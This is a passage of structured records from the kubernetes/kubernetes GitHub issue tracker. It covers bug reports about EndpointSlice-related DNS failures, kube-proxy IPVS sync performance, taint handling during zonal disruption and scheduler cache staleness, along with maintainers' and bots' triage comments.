10.42.27.29, removed IP: 10.42.56.235, removed IP: 10.42.16.82, removed IP: 10.42.7.58, removed IP: 10.42.16.86, removed IP: 10.42.17.110, removed IP: 10.42.34.108, removed IP: 10.42.10.143, removed IP: 10.42.12.43, removed IP: 10.42.59.47, removed IP: 10.42.15.111, removed IP: 10.42.27.23, removed IP: 10.42.34.110, removed IP: 10.42.19.136, removed IP: 10.42.27.25, removed IP: 10.42.8.180, removed IP: 10.42.16.76, removed IP: 10.42.6.204, removed IP: 10.42.8.177, removed IP: 10.42.40.132, removed IP: 10.42.60.79, removed IP: 10.42.59.52, removed IP: 10.42.43.238, removed IP: 10.42.44.221, removed IP: 10.42.7.54, removed IP: 10.42.12.38, removed IP: 10.42.16.90, removed IP: 10.42.9.155, removed IP: 10.42.28.211, removed IP: 10.42.7.57, removed IP: 10.42.4.165, removed IP: 10.42.8.182, removed IP: 10.42.6.209, removed IP: 10.42.9.160, removed IP: 10.42.34.113, removed IP: 10.42.4.164, removed IP: 10.42.7.62, removed IP: 10.42.1.231, removed IP: 10.42.11.116, removed IP: 10.42.12.40, removed IP: 10.42.43.236, removed IP: 10.42.40.133, removed IP: 10.42.15.115, removed IP: 10.42.27.21, removed IP: 10.42.2.55, removed IP: 10.42.17.105, removed IP: 10.42.56.240, removed IP: 10.42.32.34, removed IP: 10.42.44.222\n```\n\nSome additional information that may be helpful:\n1. We noticed that the control plane was complaining with these errors:\n\n```\nAug 06 22:20:32 node-name-foo k3s[2663]: time=\"2025-08-06T22:20:32Z\" level=warning msg=\"Proxy error: write failed: io: read/write on closed pipe\"\nAug 06 22:20:42node-name-foo k3s[2663]: I0806 22:20:42.363009    2663 endpointslice_controller.go:337] \"Error syncing endpoint slices for service, retrying\" key=\"jenkins/tortuga\" err=\"EndpointSlice informer cache is out of date\"\n```\n\n2. We are running a single control-plane k3s cluster in our lab. It's certainly possible that this node when under load cannot send out events fast enough to all services (like coredns). However, we would expect that the system should continue to resolve valid VMs to their IPs. \n\nHow does this tie into the coredns issue of returning NXDOMAIN for valid VMs?\n\nCoredns also uses endpointslice objects. One theory would be that there is a significant time gap between the slice update events. Using the example above, an update where one slice removes a (valid) VM is received and then after a delay of several seconds, the update for the second slice, which includes the previously removed VM, is received. Between these two updates, coredns returns NXDOMAIN for the valid VM. \n\nOther thoughts:\n1. The moving of endpoints between slices seems racy to me. If there is significant delay between propagating updates of the two slices, then services like coredns will have temporary inconsistencies. \n2. Is there a corner case where the endpointslice controller frequently balances endpoints across slices? Can this balancing be disabled?\n3. Should coredns (and other consumers of endpointslice) be enhanced to detect stale cache entries?  \n4. Is this expected behavior? I hope not. \n\n### What did you expect to happen?\n\nWe expect that coredns should reliably resolve IPs for VMs/Pods that are healthy.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nUnfortunately, this is not easy to produce, primarily because the issue seems to arise when the control-plane is under load and is having a hard time sending updates to all informers. \n\n### Anything else we need to know?\n\nOur current workaround has been to increase endpoints pers slice from 100 (default) to 200. This has mitigated the issue for the time being, but we would like to scale to 500+ endpoints. Single slice approach may not be appropriate at that point. \n\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.33.2\nKustomize Version: v5.6.0\nServer Version: v1.30.5+k3s1\nWARNING: version difference between client (1.33) and server (1.30) exceeds the supported minor version skew of +/-1\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nBare metal.\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\nPRETTY_NAME=\"Ubuntu 24.04 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nVERSION=\"24.04 LTS (Noble Numbat)\"\nVERSION_CODENAME=noble\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=noble\nLOGO=ubuntu-logo\n\n$ uname -a\nLinux node-name-foo 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n</details>\n\n\n### Install tools\n\n<details>\nk3s\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\ncontainerd\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\nCNI: flannel\n</details>\n", "issue_labels": ["kind/bug", "sig/network", "triage/needs-information"], "comments": [{"author": "Arvinderpal", "body": "/sig network"}, {"author": "BenTheElder", "body": "1.30 is out of support upstream: https://kubernetes.io/releases/\n\nIs this reproducible on a supported version? We may have already fixed this.\n\n> Unfortunately, this is not easy to produce, primarily because the issue seems to arise when the control-plane is under load and is having a hard time sending updates to all informers.\n\nMay be possible to replicate under synthetic load with a toy cluster?"}, {"author": "Arvinderpal", "body": "We'll look into upgrading to 1.31. \nI did look through issues and commit history for endpointslice controller. Didn't see anything related, but I could be wrong. https://github.com/kubernetes/endpointslice\n"}, {"author": "bowei", "body": "I think Ben's comment is probably key: Can you reproduce this:\n\n* Current version of Kubernetes? One thing to note is that 1.31 is also quite old, which means that you may want to consider upgrading to a more recent version.\n* If the behavior is localized to EndpointSlice controller, a smaller repro may be possible with a Kind cluster or other minimal setup with a large number of endpoints (> 100). I know that we put explicit logic in the EndpointSlice controller for some amount of hysteresis to avoid churn, but there may be a case where this is not working as intended."}, {"author": "Arvinderpal", "body": "Ok. I'll come back with an update once we have done the upgrade. "}, {"author": "danwinship", "body": "/triage needs-information"}, {"author": "aojea", "body": "/close\n\nplease reopen once you have the information requested\n\nThanks"}, {"author": "k8s-ci-robot", "body": "@aojea: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133474#issuecomment-3335001341):\n\n>/close\n>\n>please reopen once you have the information requested\n>\n>Thanks\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133773, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133773", "issue_title": "kube-proxy IPVS mode syncing rules performance problem causes API server access failure during node initialization", "issue_author": "shuoyans", "issue_body": "### What happened?\n\nWhen a new node joins a cluster with large number of services already exist in this cluster, node components(like flannel/csi-plugin) that depend on accessing API server through Kubernetes service IP (default/kubernetes) fail to start, with 30s I/O timeout. \n`I0829 05:47:15.925075 Using QPS 5 and Burst 10 for kube-apiserver  `\n` F0829 05:47:45.921632 dial tcp 192.168.0.1:443: i/o timeout  `\n\nThis is caused by 2 factors\uff1a\n1. Kube-proxy initialization sequence flaw:\n- When IPVS rules are not fully in place (especially the iptables rules required for SNAT), traffic to the Service IP fails to return because the source address is not SNATed.\n- Key missing rule:\n-A KUBE-SERVICES ! -s 10.14.0.0/16 -j KUBE-MARK-MASQ # SNAT rule (generated last)\n2. Rule delivery performance issues in IPVS mode:\n- Insufficient performance in full rule initialization in IPVS mode (linearly adding ipset records through AddEntry() func, which a very time-consuming process).\n\n### What did you expect to happen?\n\nOptimize the efficiency and performance of kube-proxy syncing rules in IPVS mode\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1. Have a cluster with large number of services (maybe 2000 services)\n2. Add a new node into cluster\n3. Observe if flannel container restarts\n\n### Anything else we need to know?\n\nIn our test case with 2k services in cluster, we monitored the detailed logs of kube-proxy container:\n\n<img width=\"958\" height=\"467\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b4887097-3ee3-4439-8a49-426297a101e2\" />\n\nit shows syncIPSetEntries consumed 14s in 17s.\n\n### Kubernetes version\n\n- Kubernetes version: (1.33.3)\n- kube-proxy mode: IPVS\n- Container runtime: containerd\n- Cloud provider: Alibaba Cloud ACK (managed)\n- Cluster scale:\n  - Services: Large scale (~2000)\n- Network configuration:\n  - VPC CIDR: 10.14.0.0/16\n  - Kubernetes service IP: 192.168.0.1:443\n\n### Cloud provider\n\n<details>\nAlibaba Cloud ACK (managed)\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/network", "area/ipvs", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "shuoyans", "body": "/sig network"}, {"author": "adrianmoisey", "body": "/area ipvs\n\nIPVS is not really maintained (and we plan on formally deprecating it soon).\nWe try to encourage users to move over to nftables if they can."}, {"author": "danwinship", "body": "Right, and even if we _were_ doing a better job of fixing ipvs bugs:\n\n> Insufficient performance in full rule initialization in IPVS mode (linearly adding ipset records through AddEntry() func, which a very time-consuming process).\n\nWe could theoretically rewrite the ipset code to use netlink rather than the command line, which would probably improve things a little, but even then it looks like we'd still be linearly adding records. (There are no batch operations in the kernel ipset API.) Ironically, while ipset helps iptables to scale better, it does not itself scale well...\n\nSo yes, as Adrian said, we're strongly encouraging ipvs users to move over to nftables, where both the kube-proxy backend and the underlying userspace/kernel APIs are being actively maintained and improved."}, {"author": "bowei", "body": "We are recommending trying nftables -- it should have all of the performance benefits of IPVS and is a well-maintained path.\nIt is unlikely for a large-scale change to be done in IPVS at this time.\n\n/close\n"}, {"author": "k8s-ci-robot", "body": "@bowei: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133773#issuecomment-3334938041):\n\n>We are recommending trying nftables -- it should have all of the performance benefits of IPVS and is a well-maintained path.\n>It is unlikely for a large-scale change to be done in IPVS at this time.\n>\n>/close\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131481, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131481", "issue_title": "Nodes Tainted with NoExecute before going into PartialDisruption are not untainted after", "issue_author": "sumukha-radhakrishna", "issue_body": "### What happened?\n\nNodes Tainted with NoExecute before going into PartialDisruption are not untainted after.\n\nWhen nodes in a zone start going into unready state, the NLC taints those nodes with NoExecute for taint manager eviction. If more than 55% (UnhealthyZoneThreshold) of nodes go unhealthy in the same zone then the zone is treated as PartialDisruption and depending on the size of the cluster either we slow down the tainting logic or stop it.\nhttps://github.com/kubernetes/kubernetes/blob/e54c8ef2024e638d721242224f6f925b15ee43f5/pkg/controller/nodelifecycle/node_lifecycle_controller.go#L1295\n\nHowever all nodes that were tainted until NLC determines there is a PartialDisruption is not untainted. But untainting is done if cluster go into MasterDisruption.\nhttps://github.com/kubernetes/kubernetes/blob/e54c8ef2024e638d721242224f6f925b15ee43f5/pkg/controller/nodelifecycle/node_lifecycle_controller.go#L1042\n\nNodes get tainted with NoExecute for taint-manager eviction, but if more nodes go unhealthy at the same time we determine there is a PartialZonalDisruption and stop tainting those nodes to stop pod eviction. \nNodes that are already tainted need to be undone to preserve workloads.\n\n### What did you expect to happen?\n\nExpected NLC to untaint nodes after going into Partial Zonal Disruption to prevent taint-manager-eviction. \n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nInduce a case where nodes slowly start going unhealthy in a zone. \n\n\n### Anything else we need to know?\nNA\n\n### Kubernetes version\nShoudl be all kubernetes version. Tested on 1.32\n\n\n### Cloud provider\nShould be across all CP, tested with AWS EKS. \n\n\n### OS version\nNA\n\n\n\n### Install tools\nNA\n\n\n### Container runtime (CRI) and version (if applicable)\nNA\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\nNA\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "BenTheElder", "body": "Please fill in the rest of the details included in the template (especially the kubernetes version and install tools) and provide more details about what happened and how to reproduce."}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131481#issuecomment-3334931942):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131467, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131467", "issue_title": "Pod scheduling failed due to pod anti-affinity.", "issue_author": "Black-max12138", "issue_body": "### What happened?\n\nThe pod is bound to the PVC on the master1 node.However, the current pod is in the pending state.\nThe log is as follows:\n```shell\nI0425 08:09:37.487898      25 schedule_one.go:1107] \"Unable to schedule pod; no fit; waiting\" pod=\"default/managekvs-1\" err=\"0/14 nodes are available: 1 node(s) didn't match pod anti-affinity rules, 11 node(s) didn't match Pod's node affinity/selector, 2 node(s) had volume node affinity conflict. preemption: 0/14 nodes are available: 1 No preemption victims found for incoming pod, 13 Preemption is not helpful for scheduling.\"\n```\nHowever, when I query the labels of all pods on the node, there is no conflicting label.\n```shell\n[root@master1 ~]# kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=master1 --show-labels | grep 'app=managekvs'\n[root@master1 ~]# \n```\nThe pod anti-affinity configuration is as follows:\n```yaml\npodAntiAffinity:\n  requiredDuringSchedulingIgnoredDuringExecution:\n  - labelSelector:\n      matchExpressions:\n      - key: app\n        operator: In\n        values:\n        - managekvs\n    topologyKey: kubernetes.io/hostname\n```\n\nhttps://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/pkg/scheduler/framework/plugins/interpodaffinity/filtering.go#L224-L263\nIt is suspected that the cache in the informer is not the latest. As a result, the old data is obtained.\n\n### What did you expect to happen?\n\nThe pod should be scheduled successfully.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nAfter the NICs of a node are started and stopped for multiple times, pods cannot be scheduled after the NICs are recovered.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n1.31\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "Black-max12138", "body": "We added some logs and found that the data in the cache was really wrong.\nLogs are added after the update method.\nhttps://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/pkg/scheduler/framework/plugins/interpodaffinity/filtering.go#L128-L135\nData in the cache contains old pods. As a result, new pods cannot be scheduled.\n```shell\nI0428 11:31:08.927999      12 filtering.go:195] \"start getIncomingAffinityAntiAffinityCounts for pod\" pod=\"managedds-1\" UID=\"13c3bbe1-c9d8-48bb-b3d5-1dec2d5a32c2\"\nI0428 11:31:08.928045      12 filtering.go:133] \"pod anti-affinity term matched\" pod=\"managedds-1\" namespace=\"default\" UID=\"73ac24b0-fbe6-4c6d-9082-e94710eea965\" node=\"master1\"\nI0428 11:31:08.928132      12 filtering.go:133] \"pod anti-affinity term matched\" pod=\"managedds-0\" namespace=\"default\" UID=\"8b58de2b-7444-4c16-a4df-3c1eba784658\" node=\"master2\"\n```\nTwo pods with the same name but different UIDs exist."}, {"author": "Black-max12138", "body": "@liggitt I think it's a problem, please look at it.\nLooks like the same problem as this issue. [#121866](https://github.com/kubernetes/kubernetes/issues/121866)"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131467#issuecomment-3334679740):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133185, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133185", "issue_title": "List available endpoints for kube-proxy's /statusz", "issue_author": "richabanker", "issue_body": "Sub-issue of https://github.com/kubernetes/kubernetes/issues/132474\n\nAdd additional text of \"Paths:\" with available paths of kube-proxy:\n\n\"/livez\"\n\"/readyz\"\n\"/healthz\"\n\"/metrics\"\n\n/sig instrumentation\n/triage accepted\n/help", "issue_labels": ["help wanted", "sig/instrumentation", "triage/accepted"], "comments": [{"author": "k8s-ci-robot", "body": "@richabanker: \n\tThis request has been marked as needing help from a contributor.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-help` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185):\n\n>Sub-issue of https://github.com/kubernetes/kubernetes/issues/132474\n>\n>Add additional text of \"Paths:\" with available paths of kube-proxy:\n>\n>\"/livez\"\n>\"/readyz\"\n>\"/healthz\"\n>\"/metrics\"\n>\n>/sig instrumentation\n>/triage accepted\n>/help\n>/good first issue\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "richabanker", "body": "/good-first-issue"}, {"author": "aman4433", "body": "/assign"}, {"author": "raimatt", "body": "/assign"}, {"author": "Yash-xoxo", "body": "**Code Changes Required:**\nThis is a documentation-only change. The work is to insert text with \"Paths:\" followed by the endpoints that are available:\n\n/livez - Liveness endpoint\n/readyz - Readiness endpoint\n/healthz - Health endpoint (deprecated but remains supported)\n/metrics - Metrics endpoint\n\n**Reference Points:**\n\nThe primary kube-controller-manager documentation page\nComparable documentation patterns utilized for other Kubernetes components\nThe documentation on health endpoints at kubernetes.io/docs/reference/using-api/health-checks/\n\n**Technical Context:**\nThe described endpoints have different functions:\n\n/healthz is the older health check endpoint\n/livez reports whether the component is alive and responsive\n/readyz reports whether the component is ready to handle requests\n/metrics serves up Prometheus-style metrics for monitoring\n\nThis is flagged as a good first issue because it's a simple doc update which doesn't need intimate knowledge of the codebase, only familiarity with where to put the doc and following existing conventions.\n"}, {"author": "demola09", "body": "/good-first-issue"}, {"author": "mihriferreira", "body": "/assign"}, {"author": "karthick-me", "body": "/assign\n"}, {"author": "antonyth18", "body": "/assign"}, {"author": "Shreyash1414", "body": "/assign"}, {"author": "klnsv", "body": "/assign\n"}, {"author": "klnsv", "body": "/de-assign"}, {"author": "ozalakshay", "body": "/assign"}, {"author": "shivani0234", "body": "/assign\n"}, {"author": "stephenzhang0713", "body": "/assign"}, {"author": "anuragkhuntia", "body": "/assign\n"}, {"author": "k8s-ci-robot", "body": "@anuragkhuntia: GitHub didn't allow me to assign the following users: anuragkhuntia.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3239831378):\n\n>/assign\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ninglonglong", "body": "/assign"}, {"author": "k8s-ci-robot", "body": "@ninglonglong: GitHub didn't allow me to assign the following users: ninglonglong.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3247593132):\n\n>/assign\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the 